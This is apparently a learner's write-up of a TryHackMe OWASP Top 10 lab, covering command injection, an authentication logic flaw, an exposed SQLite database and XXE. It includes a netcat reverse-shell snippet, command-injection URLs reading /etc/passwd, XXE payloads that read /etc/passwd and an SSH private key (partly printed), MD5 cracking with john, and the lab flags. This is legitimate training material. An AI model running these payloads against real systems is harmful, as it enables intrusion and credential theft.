# OWASP Top 10

Learn one of the OWASP vulnerabilities every day for 10 days in a row.

[OWASP Top 10](https://tryhackme.com/room/owasptop10)

## Topic's

- Injection
- OS Command Injection
- Command Injection
- Broken Authentication
- Sensitive Data Exposure
- XML External Entity
- Broken Access Control
- Security Misconfiguration
- Cross-site Scripting
- Insecure Deserialization
- Known Vulnerabilities
- Insufficient Logging and Monitoring

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## [Task 1] Introduction

![Open Web Application Security Project](https://i.imgur.com/QYg97jR.png)

**[OWASP Top 10 - A challenge everyday for 10 days]**

Learn one of the OWASP vulnerabilities every day for 10 days in a row. A new task will be revealed every day, where each task will be independent from the previous one. These challenges will cover each OWASP topic:

- Day 1) Injection
- Day 2) Broken Authentication
- Day 3) Sensitive Data Exposure
- Day 4) XML External Entity
- Day 5) Broken Access Control
- Day 6) Security Misconfiguration
- Day 7) Cross-site Scripting
- Day 8) Insecure Deserialization
- Day 9) Components with Known Vulnerabilities
- Day 10) Insufficent Logging & Monitoring

The challenges are designed for beginners and assume no previous knowledge of security.

1. Read the above.

`No answer needed`

## [Task 2] Accessing machines

1. Practise connecting to our network.

`No answer needed`

## [Task 3] Daily Prizes

`No answer needed`

## [Task 4] [Day 1] Injection

Injection flaws are very common in applications today. These flaws occur because user controlled input is interpreted as actual commands or parameters by the application. Injection attacks depend on what technologies are being used and how exactly the input is interpreted by these technologies. Some common examples include:

- SQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.
- Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.

If an attacker is able to successfully pass input that is interpreted correctly, they would be able to do the following:

- Access, Modify and Delete information in a database when this input is passed into database queries. This would mean that an attacker can steal sensitive information such as personal details and credentials.
- Execute Arbitrary system commands on a server that would allow an attacker to gain access to users’ systems. This would enable them to steal sensitive data and carry out more attacks against infrastructure linked to the server on which the command is executed.

The main defence for preventing injection attacks is ensuring that user controlled input is not interpreted as queries or commands. There are different ways of doing this:

- Using an allow list: when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.
- Stripping input: If the input contains dangerous characters, these characters are removed before they are processed.

- Dangerous characters or input is classified as any input that can change how the underlying data is processed. Instead of manually constructing allow lists or even just stripping input, there are various libraries that perform these actions for you.

1. I've understood Injection attacks.

`No answer needed`

## [Task 5] [Day 1] OS Command Injection

Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine. It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server. Sometimes this won't always end in something malicious, like a `whoami` or just reading of files. That isn't too bad. But the thing about command injection is it opens up many options for the attacker. The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as. A simple `;nc -e /bin/bash` is all that's needed and they own your server. **some variants of netcat don't support the -e option.** You can use a list of [these](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) reverse shells as an alternative.

Once the attacker has a foothold on the web server, they can start the usual enumeration of your systems and start looking for ways to pivot around. Now that we know what command injection is, we'll start going into the different types and how to test for them.

1. I've understood command injection.

`No answer needed`

## [Task 6] [Day 1] Command Injection Practical

**What is Active Command Injection?**

Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document. Active command injection will return the response to the user. It can be made visible through several HTML elements.

Let's consider a scenario: EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet. It's nowhere near finished but contains the same command injection vulnerability as before! But this time, the response from the system call can be seen on the page! They'll never learn!

Just like before, let's look at the sample code from evilshell.php and go over what it's doing and why it makes it active command injection. See if you can figure it out. I'll go over it below just as before.

**EvilShell (evilshell.php) Code Example**

![evilshell.php](https://i.imgur.com/KcGizdo.png)

In pseudocode, the above snippet is doing the following:

1. Checking if the parameter "commandString" is set
2. If it is, then the variable `$command_string` gets what was passed into the input field
3. The program then goes into a try block to execute the function `passthru($command_string)`. You can read the docs on `passthru()` on [PHP's website](https://www.php.net/manual/en/function.passthru.php), but in general, it is executing what gets entered into the input then passing the output directly back to the browser.
4. If the try does not succeed, output the error to page. Generally this won't output anything because you can't output stderr but PHP doesn't let you have a try without a catch.

**Ways to Detect Active Command Injection**

We know that active command injection occurs when you can see the response from the system call. In the above code, the function `passthru()` is actually what's doing all of the work here. It's passing the response directly to the document so you can see the fruits of your labor right there. Since we know that, we can go over some useful commands to try to enumerate the machine a bit further. The function call here to `passthru()` may not always be what's happening behind the scenes, but I felt it was the easiest and least complicated way to demonstrate the vulnerability.

**Commands to try**

**Linux**

- whoami
- id
- ifconfig/ip addr
- uname -a
- ps -ef

**Windows**

- whoami
- ver
- ipconfig
- tasklist
- netstat -an

To complete the questions below, navigate to http://MACHINE_IP/evilshell.php.

1. What strange text file is in the website root directory?

`http://10.10.175.234/evilshell.php?commandString=ls+-la`

```
total 28 drwxr-x--- 4 www-data www-data 4096 Jun 3 18:13 . drwxr-xr-x 3 root root 4096 May 18 15:21 .. drwxr-x--- 2 www-data www-data 4096 May 21 03:04 css -rw-r----- 1 www-data www-data 17 May 22 13:14 drpepper.txt -rw-r----- 1 www-data www-data 1723 May 26 01:52 evilshell.php -rw-r----- 1 www-data www-data 2200 May 21 03:04 index.php drwxr-x--- 2 www-data www-data 4096 May 21 03:04 js
```

`drpepper.txt`

2. How many non-root/non-service/non-daemon users are there?

`sudo grep '/home/' /etc/passwd | cut -d: -f1`

`http://10.10.175.234/evilshell.php?commandString=sudo+grep+%27%2Fhome%2F%27+%2Fetc%2Fpasswd+%7C+cut+-d%3A+-f1`

`sudo grep '/bin/bash' /etc/passwd | cut -d: -f1`

`http://10.10.175.234/evilshell.php?commandString=sudo+grep+%27%2Fbin%2Fbash%27+%2Fetc%2Fpasswd+%7C+cut+-d%3A+-f1`

`0`

3. What user is this app running as?

`http://10.10.175.234/evilshell.php?commandString=whoami`

`www-data`

4. What is the user's shell set as?

`http://10.10.175.234/evilshell.php?commandString=cat+%2Fetc%2Fpasswd`

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
```

`/usr/sbin/nologin`

5. What version of Ubuntu is running?

`http://10.10.175.234/evilshell.php?commandString=lsb_release+-a`

```
Distributor ID: Ubuntu Description: Ubuntu 18.04.4 LTS Release: 18.04 Codename: bionic
```

`18.04.4`

6. Print out the MOTD. What favorite beverage is shown?

`http://10.10.175.234/evilshell.php?commandString=cat+%2Fetc%2Fupdate-motd.d%2F00-header`

```
#!/bin/sh # # 00-header - create the header of the MOTD # Copyright (C) 2009-2010 Canonical Ltd. # # Authors: Dustin Kirkland # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the # GNU General Public License for more details. # # You should have received a copy of the GNU General Public License along # with this program; if not, write to the Free Software Foundation, Inc., # 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA. [ -r /etc/lsb-release ] && . /etc/lsb-release if [ -z "$DISTRIB_DESCRIPTION" ] && [ -x /usr/bin/lsb_release ]; then # Fall back to using the very slow lsb_release utility DISTRIB_DESCRIPTION=$(lsb_release -s -d) fi printf "Welcome to %s (%s %s %s)\n" "$DISTRIB_DESCRIPTION" "$(uname -o)" "$(uname -r)" "$(uname -m)" DR PEPPER MAKES THE WORLD TASTE BETTER!
```

`DR PEPPER`

## [Task 7] [Day 2] Broken Authentication

![](https://i.imgur.com/49p4BkI.png)

Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, the server would verify them. If they are correct, the server would then provide the users’ browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users' actions.

If an attacker is able to find flaws in an authentication mechanism, they would then successfully gain access to other users’ accounts. This would allow the attacker to access sensitive data (depending on the purpose of the application). Some common flaws in authentication mechanisms include:

- Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.
- Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute forcing and without multiple attempts.
- Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts.

There can be various mitigation for broken authentication mechanisms depending on the exact flaw:

- To avoid password guessing attacks, ensure the application enforces a strong password policy.
- To avoid brute force attacks, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.
- Implement Multi Factor Authentication - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.

1. I've understood broken authentication mechanisms.

`No answer needed`

## [Task 8] [Day 2] Broken Authentication Practical

For this example, we'll be looking at a logic flaw within the authentication mechanism.

A lot of times what happens is that developers forgets to sanitize the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we are going to focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit i.e re-registration of an existing user.

Let's understand this with the help of an example, say there is an existing user with the name **admin** and now we want to get access to their account so what we can do is try to re-register that username but with slight modification. We are going to enter ` admin`(notice the space in the starting). Now when you enter that in the username field and enter other required information like email id or password and submit that data. It will actually register a new user but that user will have the same right as normal admin. That new user will also be able to see all the content presented under the user **admin**.

To see this in action go to http://MACHINE_IP:8888 and try to register a user name **darren**, you'll see that user already exists so then try to register a user ` darren` and you'll see that you are now logged in and will be able to see the content present only in Darren's account which in our case is the flag that you need to retrieve.

1. What is the flag that you found in darren's account?

![](2020-09-26_08-34.png)

![](2020-09-26_08-36.png)

- [view-source:http://10.10.39.247:8888/logged](view-source:http://10.10.39.247:8888/logged)

```html
<p style="font-size: 100%; text-align: left; color:white">
  fe86079416a21a3c99937fea8874b667
</p>
```

`fe86079416a21a3c99937fea8874b667`

2. Now try to do the same trick and see if you can login as **arthur**.

`No answer needed`

3. What is the flag that you found in arthur's account?

![](2020-09-26_08-38.png)

![](2020-09-26_08-39.png)

```html
<p style="font-size: 100%; text-align: left; color:white">
  d9ac0f7db4fda460ac3edeb75d75e16e
</p>
```

`d9ac0f7db4fda460ac3edeb75d75e16e`

## [Task 9] [Day 3] Sensitive Data Exposure (Introduction)

When a webapp accidentally divulges sensitive data, we refer to it as "**Sensitive Data Exposure**". This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "**Man in The Middle Attack**", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place...). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the webserver itself...

The web application in this box contains one such vulnerability. Deploy the machine, then read through the supporting material in the following tasks as the box boots up.

1. Read the introduction to Sensitive Data Exposure and deploy the machine.

`No answer needed`

## [Task 10] [Day 3] Sensitive Data Exposure (Supporting Material 1)

The most common way to store a large amount of data in a format that is easily accessible from many locations at once is in a database. This is obviously perfect for something like a web application, as there may be many users interacting with the website at any one time. Database engines usually follow the Structured Query Language (SQL) syntax; however, alternative formats (such as NoSQL) are rising in popularity.

In a production environment it is common to see databases set up on dedicated servers, running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These databases are referred to as "flat-file" databases, as they are stored as a single file on the computer. This is much easier than setting up a full database server, and so could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today's task, so let's focus instead on flat-file databases.

As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually this would not be a problem for a webapp, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files that a user connecting to the website is able to access)? Well, we can download it and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure indeed!

That is a big hint for the challenge, so let's briefly cover some of the syntax we would use to query a flat-file database.

The most common (and simplest) format of flat-file database is an sqlite database. These can be interacted with in most programming languages, and have a dedicated client for querying them on the command line. This client is called "sqlite3", and is installed by default on Kali.

Let's suppose we have successfully managed to download a database:

![](https://i.imgur.com/tmRhcRE.png)

We can see that there is an SQlite database in the current folder.

To access it we use: `sqlite3 <database-name>`:

![](https://i.imgur.com/KJHAdI3.png)

From here we can see the tables in the database by using the `.tables` command:

![](https://i.imgur.com/kyIWl1q.png)

At this point we can dump all of the data from the table, but we won't necessarily know what each column means unless we look at the table information. First let's use `PRAGMA table_info(customers);` to see the table information, then we'll use `SELECT * FROM customers;` to dump the information from the table:

![](https://i.imgur.com/wVvHk7a.png)

We can see from the table information that there are four columns: custID, custName, creditCard and password. You may notice that this matches up with the results. Take the first row:

`0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99`

We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).

In the next task we'll look at cracking this hash.

1. Read and understand the supporting material on SQLite Databases.

## [Task 11] [Day 3] Sensitive Data Exposure (Supporting Material 2)

In the previous task we saw how to query an SQLite database for sensitive data. We found a collection of password hashes, one for each user. In this task we will briefly cover how to crack these.

When it comes to hash cracking, Kali comes pre-installed with various tools -- if you know how to use these then feel free to do so; however, they are outwith the scope of this material.

Instead we will be using the online tool: [Crackstation](https://crackstation.net/). This website is extremely good at cracking weak password hashes. For more complicated hashes we would need more sophisticated tools; however, all of the crackable password hashes used in today's challenge are weak MD5 hashes, which Crackstation should handle very nicely indeed.

When we navigate to the website we are met with the following interface:

![](https://i.imgur.com/oioleck.png)

Let's try pasting in the password hash for Joy Paulson which we found in the previous task (`5f4dcc3b5aa765d61d8327deb882cf99`). We solve the Captcha, then click the "Crack Hashes" button:

![](https://i.imgur.com/KwHMGGV.png)

We see that the hash was successfully broken, and that the user's password was "password" -- how secure!

It's worth noting that Crackstation works using a massive wordlist. If the password is not in the wordlist then Crackstation will not be able to break the hash.

The challenge is guided, so if Crackstation fails to break a hash in today's box you can assume that the hash has been specifically designed to not be crackable.

1. Read the supporting material about cracking hashes.

## [Task 12] [Day 3] Sensitive Data Exposure (Challenge)

It's now time to put what you've learnt into practice with today's challenge.

To spice things up a bit, in addition to the usual daily prize draw this box also harbours a special prize: a voucher for a one month subscription to TryHackMe. There may or may not be another hint hidden on the box, should you need it, but for the time being here's a starting point: boxes are boring, escape 'em at every opportunity.

`10.10.45.163`

1. Have a look around the webapp. The developer has left themselves a note indicating that there is sensitive data in a specific directory. What is the name of the mentioned directory?

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.45.163
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/26 20:26:22 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/api (Status: 301)
/assets (Status: 301)
/console (Status: 301)
/favicon.ico (Status: 200)
/index.php (Status: 200)
/login (Status: 301)
/server-status (Status: 403)
===============================================================
2020/09/26 20:26:48 Finished
===============================================================
```

`/assets`

2. Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

- [Index of /assets](http://10.10.45.163/assets/)

`webapp.db`

1. Use the supporting material to access the sensitive data. What is the password hash of the admin user?

```
wget http://10.10.45.163/assets/webapp.db

file webapp.db
webapp.db: SQLite 3.x database, last written using SQLite version 3022000
```

```
sqlite3 webapp.db

SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
sessions  users
sqlite>
```

```
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
```

```
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
```

`6eea9b7ef19179a06954edd0f6c05ceb`

2. Crack the hash. What is the admin's plaintext password?

```
hashid 6eea9b7ef19179a06954edd0f6c05ceb

Analyzing '6eea9b7ef19179a06954edd0f6c05ceb'
[+] MD2
[+] MD5
[+] MD4
[+] Double MD5
[+] LM
[+] RIPEMD-128
[+] Haval-128
[+] Tiger-128
[+] Skein-256(128)
[+] Skein-512(128)
[+] Lotus Notes/Domino 5
[+] Skype
[+] Snefru-128
[+] NTLM
[+] Domain Cached Credentials
[+] Domain Cached Credentials 2
[+] DNSSEC(NSEC3)
[+] RAdmin v2.x
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 admin.hash

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
qwertyuiop       (?)
1g 0:00:00:00 DONE (2020-09-26 20:35) 50.00g/s 19200p/s 19200c/s 19200C/s 123456..michael1
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

`qwertyuiop`

3. Login as the admin. What is the flag?

- [Login](http://10.10.45.163/login/)
- admin:qwertyuiop
- [view-source:http://10.10.45.163/console/](view-source:http://10.10.45.163/console/)

```html
<div class="flag">
  <p>
    Well done.<br />Your flag is:
    <code>THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}</code>
  </p>
</div>
```

`THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

## [Day 4] XML External Entity

![](https://www.acunetix.com/wp-content/uploads/2017/07/XXE_600x315.png)

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

There are two types of XXE attacks: in-band and out-of-band (OOB-XXE).

1. An in-band XXE attack is the one in which the attacker can receive an immediate response to the XXE payload.
2. out-of-band XXE attacks (also called blind XXE), there is no immediate response from the web application and attacker has to reflect the output of their XXE payload to some other file or their own server.

This challenge is from our subscriber only material - happy hacking!

1. Deploy the machine attached to the task.

## [Day 4] XML External Entity - eXtensible Markup Language

Before we move on to learn about XXE exploitation we'll have to understand XML properly.

**What is XML?**

XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.

**Why we use XML?**

1. XML is platform-independent and programming language independent, thus it can be used on any system and supports the technology change when that happens.
2. The data stored and transported using XML can be changed at any point in time without affecting the data presentation.
3. XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.
4. XML simplifies data sharing between various systems because of its platform-independent nature. XML data doesn’t require any conversion when transferred between different systems.

**Syntax**

Every XML document mostly starts with what is known as XML Prolog.

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.

Every XML document must contain a `ROOT` element. For example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

In the above example the `<mail>` is the ROOT element of that document and `<to>`, `<from>`, `<subject>`, `<text>` are the children elements. If the XML document doesn't have any root element then it would be considered `wrong` or `invalid` XML doc.

Another thing to remember is that XML is a case sensitive language. If a tag starts like `<to>` then it has to end by `</to>` and not by something like `</To>`(notice the capitalization of `T`)

Like HTML we can use attributes in XML too. The syntax for having attributes is also very similar to HTML. For example:

```html
<text category="message">You need to learn about XXE</text>
```

In the above example `category` is the attribute `name` and message is the attribute value.

1. Full form of XML

`eXtensible Markup Language`

2. Is it compulsory to have XML prolog in XML documents?

> Above the line is called XML prolog and it specifies the XML version and the encoding used in the XML document. This line is not compulsory to use but it is considered a `good practice` to put that line in all your XML documents.

`no`

3. Can we validate XML documents against a schema?

> XML allows validation using DTD and Schema. This validation ensures that the XML document is free from any syntax error.

`yes`

1. How can we specify XML version and encoding in XML document?

> Every XML document mostly starts with what is known as XML Prolog.

```xml
<?xml version="1.0" encoding="UTF-8"?>
```

`XML Prolog`

## [Day 4] XML External Entity - DTD

Before we move on to start learning about XXE we'll have to understand what is DTD in XML.

DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.

Let us try to understand this with the help of an example. Say we have a file named `note.dtd` with the following content:

```html
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
]>
```

Now we can use this DTD to validate the information of some XML document and make sure that the XML file conforms to the rules of that DTD.

Ex: Below is given an XML document that uses `note.dtd`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

So now let's understand how that DTD validates the XML. Here's what all those terms used in `note.dtd` mean

- !DOCTYPE note - Defines a root element of the document named note
- !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
- !ELEMENT to - Defines the `to` element to be of type "#PCDATA"
- !ELEMENT from - Defines the `from` element to be of type "#PCDATA"
- !ELEMENT heading - Defines the `heading` element to be of type "#PCDATA"
- !ELEMENT body - Defines the `body` element to be of type "#PCDATA"

NOTE: #PCDATA means parseable character data.

1. How do you define a new ELEMENT?

`!ELEMENT`

2. How do you define a ROOT element?

`!DOCTYPE`

3. How do you define a new ENTITY?

`!ENTITY`

## [Day 4] XML External Entity - XXE Payload

Now we'll see some XXE payload and see how they are working.

1. The first payload we'll see is very simple. If you've read the previous task properly then you'll understand this payload very easily.

```html
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
    <userInfo>
        <firstName>falcon</firstName>
        <lastName>&name;</lastName>
    </userInfo>
```

As we can see we are defining a `ENTITY` called `name` and assigning it a value `feast`. Later we are using that ENTITY in our code.

1. We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Here again, we are defining an ENTITY with the name `read` but the difference is that we are setting it value to `SYSTEM` and path of the file.

If we use this payload then a website vulnerable to XXE(normally) would display the content of the file `/etc/passwd`.

In a similar manner, we can use this kind of payload to read other files but a lot of times you can fail to read files in this manner or the reason for failure could be the file you are trying to read.

1. Try the payload mentioned in description on the website.

## [Day 4] XML External Entity - Exploiting

Now let us see some payloads in action. The payload that I'll be using is the one we saw in the previous task.

1. Let's see how the website would look if we'll try to use the payload for displaying the name.

![](https://i.imgur.com/OHXXxi4.png)

On the left side, we can see the burp request that was sent with the URL encoded payload and on the right side we can see that the payload was able to successfully display name `falcon feast`

2. Now let's try to read the `/etc/passwd`

![](https://i.imgur.com/092GSLz.png)

1. Try to display your own name using any payload.

`No answer needed`

2. See if you can read the /etc/passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
```

`No answer needed`

3. What is the name of the user in /etc/passwd

```
falcon:x:1000:1000:falcon,,,:/home/falcon:/bin/bash
```

`falcon`

4. Where is falcon's SSH key located?

`/home/falcon/.ssh/id_rsa`

5. What are the first 18 characters for falcon's private key

```xml
<!DOCTYPE any [<!ENTITY passwd SYSTEM 'file///home/falcon/.ssh/id_rsa'>]>

<any>
  <pass>&passwd;</pass>
</any>
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA7bq7Uj0ZQzFiWzKc81OibYfCGhA24RYmcterVvRvdxw0IVSC
lZ9oM4LiwzqRIEbed7/hAA0wu6Tlyy+oLHZn2i3pLur07pxb0bfYkr7r5DaKpRPB
2Echy67MiXAQu/xgHd1e7tST18B+Ubnwo4YZNxQa+vhHRx4G5NLRL8sT+Vj9atKN
MfJmbzClgOKpTNgBaAkzY5ueWww9g0CkCldOBCM38nkEwLJAzCKtaHSreXFNN2hQ
IGfizQYRDWH1EyDbaPmvZmy0lEELfMR18wjYF1VBTAl8PNCcqVVDaKaIrbnshQpO
HoqIKrf3wLn4rnU9873C3JKzX1aDP6q+P+9BlwIDAQABAoIBABnNP5GAciJ51KwD
RUeflyx+JJIBmoM5jTi/sagBZauu0vWfH4EvyPZ2SThZPfEb3/9tQvVneReUoSA5
bu5Md58Vho6CD81qCQktBAOBV0bwqIGcMFjR95gMw8RS9m4AyUnUgf438kfja5Jh
NP36ivgQZZFBqzLLzoG9Y9jlGKjiSyMvW4u63ZacCKPTpp5P53794/UVU7JiM03y
OvavZ2QveJp5BndV5lOkcIEFwFRACDK1xwzDRzx/TNJLufztb2EheMc3stNuOMea
TLKlbG0Mp/c2az8vNN6HA0QiwxYlKZ58RfdsOfbsFxAltYNnzxy9UEieXtrWVg7X
Qfi/ZeECgYEA/pfgg6BClEmipXv8hVkLWe7VwlFf4RXnxfWyi6OqC/3Yt9Q9B4Ya
6bgLzk2vPNHgJt+g2yh/TzMX6sCC9IMYedc0faiJr/VISBm25qTjqIGctwt0D3nb
j60mSKKFbwDPxrcek/7WH1cWDcaLTDdL9KPLk1JQzbwDzojrE1TDD+cCgYEA7wsA
MPm4aUDikZHKhQ5OOge+wzPNXVR6Yy1VV3WZfxRCoEuq6fYEJsKB5tykfQPC8cUn
qwGvo8TiMHbQ9KmI5FabfBK8LswQ575bnLtMxdPyBCgYqlsAIkPYQAOizUVlrOOg
